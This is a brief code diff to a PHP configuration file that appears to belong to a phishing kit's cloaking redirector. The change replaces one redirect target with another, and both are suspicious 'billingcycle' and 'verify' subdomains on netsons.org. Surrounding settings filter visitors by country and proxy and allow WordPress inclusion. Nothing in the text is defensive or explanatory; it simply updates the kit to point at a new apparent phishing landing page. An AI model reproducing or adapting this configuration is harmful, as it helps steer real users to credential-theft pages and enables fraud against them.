@@ -57,7 +57,7 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://1-11-2025billingcycle.netsons.org/";
+$redirect = "https://82cc921c6a5c6707-verify.netsons.org/25/netsons";
 
 $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
